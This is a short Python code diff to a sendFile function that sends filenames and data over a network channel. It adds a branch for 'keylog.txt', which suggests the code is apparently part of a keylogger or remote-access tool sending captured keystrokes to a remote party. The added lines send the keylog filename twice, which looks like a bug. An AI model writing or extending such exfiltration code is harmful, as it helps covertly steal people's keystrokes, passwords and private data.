@@ -150,7 +150,7 @@ def sendFile(dataFile,  keyLoc, filename):
         #send this filename
         strn = filename
         
-        chan.send(strn.encode('utf-8'))
+        chan.sendall(strn.encode('utf-8'))
         #recieve a response for OK
 
         str = "|"
@@ -160,11 +160,14 @@ def sendFile(dataFile,  keyLoc, filename):
                 str += values + ","
             str += "|"
         print(str)
-        chan.send(str.encode('utf-8'))
-        
+        chan.sendall(str.encode('utf-8'))
     
     elif filename == 'keylog.txt':
         print(filename)
+        strn = filename
+        
+        chan.sendall(strn.encode('utf-8'))
+        chan.sendall(strn.encode('utf-8'))
         
         #send this filename
     
